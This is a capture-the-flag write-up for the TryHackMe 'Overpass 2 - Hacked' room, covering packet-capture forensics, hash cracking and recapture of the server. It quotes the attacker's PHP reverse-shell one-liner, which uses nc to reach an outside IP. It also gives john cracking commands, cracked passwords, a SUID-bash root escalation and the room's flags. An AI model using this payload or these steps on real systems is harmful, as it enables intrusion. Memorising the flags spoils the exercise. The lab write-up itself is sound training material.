# Overpass 2 - Hacked

## Forensics

**Related files**
* `overpass2.pcapng` - Wireshark packet file
* `upload.php` - Uploaded php script
* `shadow` - Shadow file
* `shadow_hashes` - List of hashes from `shadow` file
* `fasttrack.txt` - Wordlist for hash cracking

Analyzing the `.pcapng` file we can see that the `/development/` page is what was used to upload a reverse shell. The file itself contained the following php script: `<?php exec("rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 192.168.170.145 4242 >/tmp/f")?>` (located in `upload.php`). Once in the password `whenevernoteartinstant` was used for privelage escalation. To establish persistence the attacker used [this](https://github.com/NinjaJc01/ssh-backdoor) repository. From the passwords in the shadow file `4` of them were able to be cracked using the `fasttrack.txt` wordlist using `john --wordlist=fasttrack.txt shadow_hashes` as the command:

```
secret12
abcd123
1qaz2wsx
secuirty3
```

## Research

**Related files**
* `hash` - File containing hash and salt in format: hash$salt

The default hash and salt can be found by looking at the Github repository in the `main.go` file. The default hash is `bdd04d9bb7621687f5df9001f5098eb22bf19eac4c2c30b6f23efed4d24807277d0f8bfccb9e77659103d78c56e66d2d7d8391dfc885d0e9b68acd01fc2170e3` and the hardcoded salt is `1c362db832f3f864c8c2fe05f2002a05`. The hash that the attacker specifically used is `6d05358f090eea56a238af02e47d44ee5489d234810ef6240280857ec69712a3e5e370b8a41899d0196ade16c0d54327c5654019292cbfe0b5e98ad1fec71bed`. Using `john -format='dynamic=sha512($p.$s)' --wordlist=/usr/share/wordlists/rockyou.txt hash` The `hash$salt` combination string was able to be decrypted to be `november16`.

## Attack

**Related files**
* `nmap.log` - Nmap log

By running an `nmap` scan we can see that ports 22, 80 and 2222 are open. By looking at the website hosted on port 80 we can see that the message left was `H4ck3d by CooctusClan`. To get a shell on the server we can try to ssh with both port 22 and 2222 with the credentials and passwords that we have found. The combination that ends up working is `ssh -p 2222 james@10.10.228.58` being the command and `november16` being the password. The user flag can be easily found as `thm{d119b4fa8c497ddb0525f7ad200e6567}`. Running linpeas allows us to see that we have sudo permissions. Attempting to run sudo with any password that we have will not work so we need to figure something else out. In the SUID section it hints to a file called `.suid_bash` so we attempt to run it with `./.suid_bash -p` to hopefully get us a privileged shell which works! After this we can simply just cat out the root flag which is `thm{d53b2684f169360bb9606c333873144d}`.